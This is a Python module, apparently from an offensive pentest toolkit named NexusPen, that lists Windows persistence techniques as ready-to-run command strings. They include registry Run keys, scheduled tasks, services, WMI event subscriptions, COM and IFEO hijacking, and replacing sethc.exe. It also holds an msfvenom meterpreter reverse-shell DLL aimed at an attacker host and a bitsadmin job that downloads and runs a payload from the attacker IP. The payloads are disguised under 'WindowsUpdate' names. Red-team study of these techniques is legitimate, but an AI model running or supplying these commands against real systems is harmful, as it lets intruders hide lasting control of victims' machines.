#!/usr/bin/env python3
"""
NexusPen - Windows Persistence Module
======================================
Windows persistence techniques.
"""

import subprocess
from typing import Dict, List
from dataclasses import dataclass

from rich.console import Console
from rich.table import Table

console = Console()


@dataclass
class PersistenceMethod:
    """Persistence technique."""
    name: str
    category: str
    description: str
    command: str
    requires_admin: bool
    detection_difficulty: str
    cleanup: str


class WindowsPersistence:
    """
    Windows persistence techniques.
    """
    
    def __init__(self, payload_path: str = 'C:\\temp\\payload.exe',
                 attacker_ip: str = '10.10.10.10', attacker_port: int = 4444):
        self.payload = payload_path
        self.attacker_ip = attacker_ip
        self.attacker_port = attacker_port
        self.methods: List[PersistenceMethod] = []
    
    def registry_run_keys(self) -> PersistenceMethod:
        """Registry Run keys persistence."""
        method = PersistenceMethod(
            name='Registry Run Keys',
            category='Registry',
            description='Execute payload on user login',
            command=f'''
# User level (no admin)
reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "Update" /t REG_SZ /d "{self.payload}" /f

# System level (admin)
reg add "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "Update" /t REG_SZ /d "{self.payload}" /f

# Alternative RunOnce (runs once then deletes)
reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce" /v "Update" /t REG_SZ /d "{self.payload}" /f
''',
            requires_admin=False,
            detection_difficulty='Easy',
            cleanup='reg delete "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "Update" /f'
        )
        self.methods.append(method)
        return method
    
    def scheduled_task(self) -> PersistenceMethod:
        """Scheduled task persistence."""
        method = PersistenceMethod(
            name='Scheduled Task',
            category='Scheduled Tasks',
            description='Execute payload at scheduled times',
            command=f'''
# At logon
schtasks /create /tn "WindowsUpdate" /tr "{self.payload}" /sc onlogon /ru System

# Every 5 minutes
schtasks /create /tn "WindowsUpdate" /tr "{self.payload}" /sc minute /mo 5

# At startup (admin)
schtasks /create /tn "WindowsUpdate" /tr "{self.payload}" /sc onstart /ru System

# PowerShell
$action = New-ScheduledTaskAction -Execute "{self.payload}"
$trigger = New-ScheduledTaskTrigger -AtLogOn
Register-ScheduledTask -TaskName "Update" -Action $action -Trigger $trigger
''',
            requires_admin=False,
            detection_difficulty='Medium',
            cleanup='schtasks /delete /tn "WindowsUpdate" /f'
        )
        self.methods.append(method)
        return method
    
    def startup_folder(self) -> PersistenceMethod:
        """Startup folder persistence."""
        method = PersistenceMethod(
            name='Startup Folder',
            category='Startup',
            description='Payload in startup folder',
            command=f'''
# Current user
copy "{self.payload}" "%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\update.exe"

# All users (admin)
copy "{self.payload}" "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\update.exe"

# PowerShell shortcut
$WshShell = New-Object -ComObject WScript.Shell
$Shortcut = $WshShell.CreateShortcut("$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\update.lnk")
$Shortcut.TargetPath = "{self.payload}"
$Shortcut.Save()
''',
            requires_admin=False,
            detection_difficulty='Easy',
            cleanup='del "%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\update.exe"'
        )
        self.methods.append(method)
        return method
    
    def service_creation(self) -> PersistenceMethod:
        """Windows service persistence."""
        method = PersistenceMethod(
            name='Windows Service',
            category='Services',
            description='Create malicious service',
            command=f'''
# Create service
sc create "WindowsUpdateSvc" binPath= "{self.payload}" start= auto DisplayName= "Windows Update Service"
sc start "WindowsUpdateSvc"

# Or using PowerShell
New-Service -Name "WindowsUpdate" -BinaryPathName "{self.payload}" -DisplayName "Windows Update" -StartupType Automatic
Start-Service -Name "WindowsUpdate"
''',
            requires_admin=True,
            detection_difficulty='Medium',
            cleanup='sc delete "WindowsUpdateSvc"'
        )
        self.methods.append(method)
        return method
    
    def wmi_subscription(self) -> PersistenceMethod:
        """WMI event subscription persistence."""
        method = PersistenceMethod(
            name='WMI Event Subscription',
            category='WMI',
            description='WMI permanent event consumer',
            command=f'''
# PowerShell WMI persistence
$filterName = "UpdateFilter"
$consumerName = "UpdateConsumer"

# Create event filter (trigger on startup)
$wmiEventFilter = Set-WmiInstance -Class __EventFilter -Namespace "root\\subscription" -Arguments @{{
    Name = $filterName
    EventNamespace = "root\\cimv2"
    QueryLanguage = "WQL"
    Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 200 AND TargetInstance.SystemUpTime < 320"
}}

# Create consumer
$wmiEventConsumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace "root\\subscription" -Arguments @{{
    Name = $consumerName
    CommandLineTemplate = "{self.payload}"
}}

# Bind filter to consumer
Set-WmiInstance -Class __FilterToConsumerBinding -Namespace "root\\subscription" -Arguments @{{
    Filter = $wmiEventFilter
    Consumer = $wmiEventConsumer
}}
''',
            requires_admin=True,
            detection_difficulty='Hard',
            cleanup='''
Get-WmiObject __FilterToConsumerBinding -Namespace root\\subscription | Remove-WmiObject
Get-WmiObject CommandLineEventConsumer -Namespace root\\subscription | Remove-WmiObject
Get-WmiObject __EventFilter -Namespace root\\subscription | Remove-WmiObject
'''
        )
        self.methods.append(method)
        return method
    
    def dll_hijacking(self) -> PersistenceMethod:
        """DLL hijacking persistence."""
        method = PersistenceMethod(
            name='DLL Hijacking',
            category='DLL',
            description='Replace or add DLL to search path',
            command='''
# Find vulnerable programs (missing DLLs)
# Use Process Monitor to identify DLL search order issues

# Common targets:
# C:\\Windows\\System32\\wbem\\loadperf.dll
# C:\\Program Files\\Application\\missing.dll

# Generate malicious DLL
msfvenom -p windows/meterpreter/reverse_tcp LHOST=ATTACKER LPORT=4444 -f dll > evil.dll

# Place in application directory or System32
copy evil.dll "C:\\Program Files\\VulnApp\\missing.dll"
''',
            requires_admin=True,
            detection_difficulty='Hard',
            cleanup='Delete the malicious DLL'
        )
        self.methods.append(method)
        return method
    
    def com_hijacking(self) -> PersistenceMethod:
        """COM object hijacking."""
        method = PersistenceMethod(
            name='COM Hijacking',
            category='COM',
            description='Hijack COM object for persistence',
            command=f'''
# Find CLSID to hijack (user-writable in HKCU takes precedence)
# Example: hijacking a commonly used CLSID

reg add "HKCU\\Software\\Classes\\CLSID\\{{b5f8350b-0548-48b1-a6ee-88bd00b4a5e2}}\\InprocServer32" /ve /t REG_SZ /d "{self.payload}" /f
reg add "HKCU\\Software\\Classes\\CLSID\\{{b5f8350b-0548-48b1-a6ee-88bd00b4a5e2}}\\InprocServer32" /v ThreadingModel /t REG_SZ /d "Apartment" /f

# The COM object will load our DLL when triggered
''',
            requires_admin=False,
            detection_difficulty='Hard',
            cleanup='reg delete "HKCU\\Software\\Classes\\CLSID\\{b5f8350b-0548-48b1-a6ee-88bd00b4a5e2}" /f'
        )
        self.methods.append(method)
        return method
    
    def bitsadmin_job(self) -> PersistenceMethod:
        """BITS job persistence."""
        method = PersistenceMethod(
            name='BITS Job',
            category='BITS',
            description='Background Intelligent Transfer Service job',
            command=f'''
# Create persistent BITS job
bitsadmin /create updatejob
bitsadmin /addfile updatejob http://{self.attacker_ip}/payload.exe {self.payload}
bitsadmin /SetNotifyCmdLine updatejob {self.payload} NULL
bitsadmin /SetMinRetryDelay updatejob 60
bitsadmin /resume updatejob
''',
            requires_admin=False,
            detection_difficulty='Medium',
            cleanup='bitsadmin /cancel updatejob'
        )
        self.methods.append(method)
        return method
    
    def netsh_helper(self) -> PersistenceMethod:
        """Netsh helper DLL persistence."""
        method = PersistenceMethod(
            name='Netsh Helper DLL',
            category='Netsh',
            description='Register DLL as netsh helper',
            command=f'''
# Create malicious DLL that exports InitHelperDll
# Register as netsh helper
netsh add helper {self.payload.replace('.exe', '.dll')}

# DLL will be loaded when netsh runs
# Many system processes use netsh
''',
            requires_admin=True,
            detection_difficulty='Hard',
            cleanup=f'netsh delete helper {self.payload.replace(".exe", ".dll")}'
        )
        self.methods.append(method)
        return method
    
    def winlogon_helper(self) -> PersistenceMethod:
        """Winlogon helper persistence."""
        method = PersistenceMethod(
            name='Winlogon Helper',
            category='Registry',
            description='Winlogon helper DLL or shell',
            command=f'''
# Modify Winlogon Shell
reg add "HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon" /v Shell /t REG_SZ /d "explorer.exe, {self.payload}" /f

# Or add Userinit
reg add "HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon" /v Userinit /t REG_SZ /d "C:\\Windows\\System32\\userinit.exe, {self.payload}" /f
''',
            requires_admin=True,
            detection_difficulty='Medium',
            cleanup='Restore original Winlogon values'
        )
        self.methods.append(method)
        return method
    
    def print_spooler(self) -> PersistenceMethod:
        """Print Spooler persistence."""
        method = PersistenceMethod(
            name='Print Spooler',
            category='Printer',
            description='Monitor or port monitor persistence',
            command='''
# Add malicious port monitor DLL
# DLL must export InitializePrintMonitor2

reg add "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Print\\Monitors\\EvilMonitor" /v Driver /t REG_SZ /d "evil.dll" /f

# DLL in C:\\Windows\\System32 will be loaded by spoolsv.exe
copy evil.dll C:\\Windows\\System32\\
''',
            requires_admin=True,
            detection_difficulty='Hard',
            cleanup='reg delete "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Print\\Monitors\\EvilMonitor" /f'
        )
        self.methods.append(method)
        return method
    
    def screensaver(self) -> PersistenceMethod:
        """Screensaver persistence."""
        method = PersistenceMethod(
            name='Screensaver',
            category='UI',
            description='Malicious screensaver',
            command=f'''
# Set payload as screensaver (must be .scr)
copy {self.payload} %APPDATA%\\evil.scr

reg add "HKCU\\Control Panel\\Desktop" /v SCRNSAVE.EXE /t REG_SZ /d "%APPDATA%\\evil.scr" /f
reg add "HKCU\\Control Panel\\Desktop" /v ScreenSaveActive /t REG_SZ /d "1" /f
reg add "HKCU\\Control Panel\\Desktop" /v ScreenSaverTimeout /t REG_SZ /d "60" /f
''',
            requires_admin=False,
            detection_difficulty='Easy',
            cleanup='reg delete "HKCU\\Control Panel\\Desktop" /v SCRNSAVE.EXE /f'
        )
        self.methods.append(method)
        return method
    
    def accessibility_features(self) -> PersistenceMethod:
        """Accessibility features (Sticky Keys) persistence."""
        method = PersistenceMethod(
            name='Accessibility Features',
            category='System',
            description='Replace accessibility executables',
            command=f'''
# Backup and replace sethc.exe (Sticky Keys)
takeown /f C:\\Windows\\System32\\sethc.exe
icacls C:\\Windows\\System32\\sethc.exe /grant administrators:F
move C:\\Windows\\System32\\sethc.exe C:\\Windows\\System32\\sethc.exe.bak
copy {self.payload} C:\\Windows\\System32\\sethc.exe

# Press SHIFT 5 times at login screen to trigger
# Works for: sethc.exe, utilman.exe, osk.exe, narrator.exe, magnify.exe, displayswitch.exe
''',
            requires_admin=True,
            detection_difficulty='Medium',
            cleanup='move C:\\Windows\\System32\\sethc.exe.bak C:\\Windows\\System32\\sethc.exe'
        )
        self.methods.append(method)
        return method
    
    def image_file_execution(self) -> PersistenceMethod:
        """Image File Execution Options (IFEO) persistence."""
        method = PersistenceMethod(
            name='IFEO Debugger',
            category='Registry',
            description='Debugger for executable',
            command=f'''
# Add debugger for notepad.exe - executes payload instead
reg add "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\notepad.exe" /v Debugger /t REG_SZ /d "{self.payload}" /f

# GlobalFlags (silent process exit)
reg add "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\notepad.exe" /v GlobalFlag /t REG_DWORD /d 512 /f
reg add "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\notepad.exe" /v MonitorProcess /t REG_SZ /d "{self.payload}" /f
''',
            requires_admin=True,
            detection_difficulty='Medium',
            cleanup='reg delete "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\notepad.exe" /f'
        )
        self.methods.append(method)
        return method
    
    def display_all_methods(self):
        """Display all persistence methods."""
        # Generate all methods
        self.registry_run_keys()
        self.scheduled_task()
        self.startup_folder()
        self.service_creation()
        self.wmi_subscription()
        self.dll_hijacking()
        self.com_hijacking()
        self.bitsadmin_job()
        self.netsh_helper()
        self.winlogon_helper()
        self.print_spooler()
        self.screensaver()
        self.accessibility_features()
        self.image_file_execution()
        
        table = Table(title="Windows Persistence Methods", show_header=True,
                     header_style="bold magenta")
        table.add_column("Name", style="cyan", width=22)
        table.add_column("Category", width=12)
        table.add_column("Admin", width=8)
        table.add_column("Detection", width=10)
        
        for method in self.methods:
            table.add_row(
                method.name,
                method.category,
                "[red]Yes[/red]" if method.requires_admin else "[green]No[/green]",
                method.detection_difficulty
            )
        
        console.print(table)
